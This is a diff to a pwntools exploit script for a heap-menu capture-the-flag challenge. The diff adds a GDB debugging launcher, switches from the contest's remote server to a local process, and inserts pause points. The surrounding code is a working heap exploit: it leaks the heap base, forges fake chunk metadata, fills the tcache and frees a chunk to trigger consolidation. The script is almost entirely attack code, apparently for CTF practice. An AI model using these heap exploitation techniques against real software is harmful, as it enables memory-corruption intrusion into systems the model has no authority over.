@@ -4,6 +4,12 @@ from pwn import *
 exe  = context.binary = ELF(args.EXE or './chall')
 libc = ELF(exe.libc.path)
 
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
 def add(idx, size): 
    io.sendlineafter(b"> ", b'1')
    io.sendlineafter(b": ", str(idx).encode())
@@ -22,7 +28,12 @@ def delete(idx):
    io.sendlineafter(b"> ", b'4')
    io.sendlineafter(b": ", str(idx).encode())
 
-io = remote("remote.infoseciitr.in", 8000)
+gdbscript = '''
+init-pwndbg
+c
+'''.format(**locals())
+
+io = start()
 
 io.recvuntil(b'..0x')
 heap_base = int(io.recvline().strip(), 16) - 0x2a0
@@ -35,11 +46,14 @@ add (2, 0xf8)
 
 edit(1, b'A'*0x50 + p64((heap_base + 0x380) - (heap_base + 0x2c0)))
 edit(0, p64(0) + p64((heap_base + 0x380) - (heap_base + 0x2c0)) + p64(heap_base + 0x2c0)*2)
+pause()
 
 for i in range(7): add(3 + i, 0xf8)
 for i in range(7): delete(3 + i)
 
+pause()
 delete(2)
+pause()
 io.sendlineafter(b'> ', b'6') ; show(0)
 
 io.recvuntil(b': ')
